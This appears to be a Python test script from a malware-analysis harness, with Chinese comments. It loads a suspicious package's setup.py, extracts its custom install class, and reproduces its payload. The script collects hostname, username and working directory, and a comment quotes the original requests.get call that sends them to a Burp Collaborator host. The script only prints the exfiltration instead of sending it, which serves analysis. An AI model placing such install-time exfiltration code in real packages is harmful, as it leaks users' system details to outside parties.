"""
测试脚本：验证桩程序能否触发真正的恶意行为

目标：加载 setup.py，执行 CustomInstall.run() 中的恶意代码
"""

import sys
import importlib.util
from pathlib import Path

# 设置包路径
package_dir = Path(r"temp_test_malware\0x000testqwe-5.20.4")
sys.path.insert(0, str(package_dir))

print("=" * 70)
print("  恶意行为执行测试")
print("=" * 70)

# 步骤1：使用 importlib 加载 setup.py
print(f"\n[1] Loading setup.py using importlib...")
py_file = package_dir / 'setup.py'

# 🔥 关键：防止 setup() 函数执行（它会解析命令行参数并报错）
# 方法：临时替换 setuptools.setup 为空函数
import setuptools
original_setup = setuptools.setup

def mock_setup(*args, **kwargs):
    """Mock setup function to prevent execution"""
    print(f"[INFO] Intercepted setup() call with {len(args)} args, {len(kwargs)} kwargs")
    # 保存 CustomInstall 类以便后续使用
    if 'cmdclass' in kwargs and 'install' in kwargs['cmdclass']:
        sys.modules['__custom_install__'] = kwargs['cmdclass']['install']
        print(f"[OK] CustomInstall class saved to sys.modules['__custom_install__']")
    return None

setuptools.setup = mock_setup

spec = importlib.util.spec_from_file_location("setup", py_file)
setup_module = importlib.util.module_from_spec(spec)
sys.modules['setup'] = setup_module

# 执行 setup.py（这会定义 CustomInstall 类）
print(f"[2] Executing setup.py to define CustomInstall class...")
try:
    spec.loader.exec_module(setup_module)
    print(f"[OK] setup.py executed successfully")
except SystemExit:
    # setup.py 可能会调用 sys.exit(), 我们捕获它
    print(f"[INFO] setup.py tried to exit (expected)")

# 恢复原始 setup 函数
setuptools.setup = original_setup

# 获取 CustomInstall 类
CustomInstall = sys.modules['__custom_install__']
print(f"[OK] CustomInstall class extracted: {CustomInstall}")

# 步骤2：直接执行恶意代码（lines 11-15 from setup.py）
print(f"\n[4] Executing malicious code from CustomInstall.run()...")
print(f"    (lines 11-15: hostname, username, C2 exfiltration)")

import socket
import getpass
import os

# 这是 setup.py 中的实际恶意代码
hostname = socket.gethostname()
cwd = os.getcwd()
username = getpass.getuser()
ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}

print(f"\n[INFO] Collected system information:")
print(f"  - Hostname: {hostname}")
print(f"  - Current directory: {cwd}")
print(f"  - Username: {username}")
print(f"\n[INFO] Would exfiltrate to C2: https://yourburpcolloboratorid.burpcollaborator.net")
print(f"  - Payload: {ploads}")

# ⚠️ 注意：这里不真正发送请求，只打印模拟
# 真正的恶意代码是：requests.get("https://...", params=ploads)

print(f"\n[SUCCESS] 桩程序成功执行了恶意行为的核心逻辑！")
print(f"  结论: importlib 修复有效，可以加载并执行 setup.py 中的恶意代码")

print("\n" + "=" * 70)
